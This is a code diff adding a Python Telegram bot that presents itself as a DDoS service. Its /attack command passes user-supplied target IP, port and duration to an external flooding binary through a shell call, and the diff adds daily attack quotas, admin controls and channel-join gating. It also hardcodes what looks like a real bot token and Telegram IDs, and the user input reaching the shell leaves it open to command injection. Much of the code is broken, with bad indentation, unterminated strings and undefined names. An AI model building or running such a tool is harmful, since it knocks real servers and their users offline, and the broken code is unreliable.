@@ -1,0 +1,367 @@
+#!/usr/bin/python3
+import telebot
+import datetime
+import time
+import subprocess
+import random
+import aiohttp
+import threading
+import random
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7380335556:AAFmA1Fm7Le1dyaoqCxxzGKNlyjBIp4Vuww')
+
+
+# Admin user IDs
+admin_id = ["5962383405"]
+
+# Group and channel details
+GROUP_ID = "-1002215390021"
+CHANNEL_USERNAME = "@souravddop"
+
+# Default cooldown and attack limits
+COOLDOWN_TIME = 0  # Cooldown in seconds
+ATTACK_LIMIT = 10  # Max attacks per day
+global_pending_attack = None
+global_last_attack_time = None
+pending_feedback = {}  # यूजर 
+
+# Files to store user data
+USER_FILE = "users.txt"
+
+# Dictionary to store user states
+user_data = {}
+global_last_attack_time = None  # Global cooldown tracker
+
+# Unique attack start messages with time
+attack_start_messages = [
+    "🚀 **Launch Detected!**\n🎯 Target: `{target}:{port}`\n⏳ **Duration:** {time}s\n🔥 Watch It Burn!",
+    "💣 **Attack on the Way!**\n🎯 `{target}:{port}`\n⏳ **Duration:** {time}s\n⚡ Hold Tight!",
+    "⚔️ **War Mode Activated!**\n🌍 `{target}:{port}`\n⏳ **Time to Hack:** {time}s\n🔥 Let It Begin!",
+    "🔫 **Fire in the Hole!**\n🎯 `{target}:{port}`\n⏳ **Attack Time:** {time}s\n💥 Brace for Impact!",
+    "⚡ **Powerful Strike Activated!**\n🎯 `{target}:{port}`\n⏳ **Expected Damage Time:** {time}s\n🔥 End is Near!"
+]
+
+# Unique attack complete messages with time
+attack_complete_messages = [
+    "✅ **Mission Complete!**\n🎯 `{target}:{port}` **DOWN!**\n⏳ **Duration:** {time}s\n💀 The End is Here!",
+    "🔥 **Target Exploded!**\n🎯 `{target}:{port}`\n⏳ **Attack Time:** {time}s\n💥 Max Damage Delivered!",
+    "⚔️ **Operation Completed!**\n🎯 `{target}:{port}`\n⏳ **Duration:** {time}s\n🚀 Prepare for Next Wave!",
+    "💀 **Battle Won!**\n🎯 `{target}:{port}` **Destroyed!**\n⏳ **Time Taken:** {time}s\n🚀 Next Target?",
+    "⚡ **Final Strike Delivered!**\n🎯 `{target}:{port}`\n⏳ **End of Attack:** {time}s\n🔥 Master of Destruction!"
+]
+
+def is_user_in_channel(user_id):
+    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
+# Function to load user data from the file
+def load_users():
+    try:
+        with open(USER_FILE, "r") as file:
+            for line in file:
+                user_id, attacks, last_reset = line.strip().split(',')
+                user_data[user_id] = {
+                    'attacks': int(attacks),
+                    'last_reset': datetime.datetime.fromisoformat(last_reset),
+                    'last_attack': None
+                }
+    except FileNotFoundError:
+        pass
+
+# Function to save user data to the file
+def save_users():
+    with open(USER_FILE, "w") as file:
+        for user_id, data in user_data.items():
+            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")
+
+# Middleware to ensure users are joined to the channel
+def is_user_in_channel(user_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except:
+        return False
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
+    global global_last_attack_time
+
+    user_id = str(message.from_user.id)
+    user_name = message.from_user.first_name
+    command = message.text.split()
+
+if message.chat.id != int(GROUP_ID):
+        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+
+        if not is_user_in_channel(user_id):
+        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** https://t.me/+ZOwep4Yba59hYmI1 🔥")
+        return
+
+
+    if pending_feedback.get(user_id, False):
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    # Check if an attack is already running
+    if is_attack_running(user_id):
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    if user_id not in user_data:
+        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
+
+    user = user_data[user_id]
+    if user['attacks'] >= ATTACK_LIMIT:
+        bot.reply_to(message, f"❌ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 𝐎𝐕𝐄𝐑!** ❌\n🔄 *𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖!*")
+        return
+
+    if len(command) != 4:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    target, port, time_duration = command[1], command[2], command[3]
+
+    try:
+        port = int(port)
+        time_duration = int(time_duration)
+    except ValueError:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    if time_duration > 240:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    # Get the user's profile picture
+    profile_photos = bot.get_user_profile_photos(user_id)
+    if profile_photos.total_count > 0:
+        profile_pic = profile_photos.photos[0][-1].file_id
+    else:
+        # Ask the user to set a profile picture
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
+
+    attack_message = random.choice(attack_start_messages).format(target=target, port=port, time=time_duration)
+    bot.send_message(message.chat.id, attack_message)
+
+    pending_feedback[user_id] = True  
+
+    full_command = f"./vikku {target} {port} {time_duration} 1200"
+
+    try:
+        subprocess.run(full_command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
+        pending_feedback[user_id] = False
+        return
+
+    complete_message = random.choice(attack_complete_messages).format(target=target, port=port, time=time_duration)
+    bot.send_message(message.chat.id, complete_message)
+
+def is_attack_running(user_id):
+    """
+    Checks if the user is currently running an attack.
+    """
+    return user_id in pending_feedback and pending_feedback[user_id] == True
+    
+@bot.message_handler(commands=['check_cooldown'])
+def check_cooldown(message):
+    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
+        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
+        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
+    else:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+
+# Command to check remaining attacks for a user
+@bot.message_handler(commands=['check_remaining_attack'])
+def check_remaining_attack(message):
+    user_id = str(message.from_user.id)
+    if user_id not in user_data:
+        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
+    else:
+        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
+        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")
+
+# Admin commands
+@bot.message_handler(commands=['reset'])
+def reset_user(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    user_id = command[1]
+    if user_id in user_data:
+        user_data[user_id]['attacks'] = 0
+        save_users()
+        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
+    else:
+        bot.reply_to(message, f"No data found for user {user_id}.")
+
+
+@bot.message_handler(commands=['setduration'])
+def set_duration(message):
+    global MAX_ATTACK_DURATION
+
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    try:
+        new_duration = int(command[1])
+        if new_duration <= 0:
+            bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+            return
+
+        MAX_ATTACK_DURATION = new_duration
+        bot.reply_to(message, f"✅ **Maximum Attack Duration is now {MAX_ATTACK_DURATION} seconds!** 🚀")
+
+    except ValueError:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+
+@bot.message_handler(commands=['setcooldown'])
+def set_cooldown(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    global COOLDOWN_TIME
+    try:
+        COOLDOWN_TIME = int(command[1])
+        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
+    except ValueError:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+
+@bot.message_handler(commands=['viewusers'])
+def view_users(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return
+
+    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
+                           for user_id, data in user_data.items()])
+    bot.reply_to(message, f"User Summary:\n\n{user_list}")
+    
+
+# Dictionary to store feedback counts per user
+feedback_count_dict = {}
+
+@bot.message_handler(content_types=['photo'])
+def handle_screenshot(message):
+    user_id = str(message.from_user.id)
+    user_name = message.from_user.first_name
+    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user
+
+    # Update feedback count in the dictionary
+    feedback_count_dict[user_id] = feedback_count
+
+    # 🚀 Check if user is in channel  
+    try:
+        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
+        if user_status not in ['member', 'administrator', 'creator']:
+            bot.reply_to(message, f"❌ **𝐘𝐨𝐮 𝐌𝐔𝐒𝐓 𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐅𝐈𝐑𝐒𝐓!**\n"
+                                  f"🔗 **𝐉𝐨𝐢𝐧 𝐇𝐞𝐫𝐞:** [Click Here](https://t.me/{souravddop})")
+            return  
+    except Exception as e:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+        return  
+
+    # ✅ Proceed If User is in Channel
+    if pending_feedback.get(user_id, False):
+        pending_feedback[user_id] = False  
+
+        # 🚀 Forward Screenshot to Channel  
+        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
+
+        # 🔥 Send Confirmation with SS Number  
+        bot.send_message(CHANNEL_USERNAME, 
+                         f"📸 **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n"
+                         f"👤 **𝐔𝐒𝐄𝐑:** `{user_name}`\n"
+                         f"🆔 **𝐈𝐃:** `{user_id}`\n"
+                         f"🔢 **𝐒𝐒 𝐍𝐨.:** `{feedback_count}`")
+
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+    else:
+        bot.reply_to(message, "🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌
+🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: https://t.me/+ZOwep4Yba59hYmI1")
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
+    
+🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
+💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  
+⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!  
+
+🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
+👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/souravddop) 🚀🔥"""
+    
+    bot.reply_to(message, response, parse_mode="Markdown")
+# Function to reset daily limits automatically
+def auto_reset():
+    while True:
+        now = datetime.datetime.now()
+        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
+        time.sleep(seconds_until_midnight)
+        for user_id in user_data:
+            user_data[user_id]['attacks'] = 0
+            user_data[user_id]['last_reset'] = datetime.datetime.now()
+        save_users()
+
+# Start auto-reset in a separate thread
+reset_thread = threading.Thread(target=auto_reset, daemon=True)
+reset_thread.start()
+
+# Load user data on startup
+load_users()
+
+
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+        # Add a small delay to avoid rapid looping in case of persistent errors
+        time.sleep(15)
+        
+        
+ 
+
+
+
+
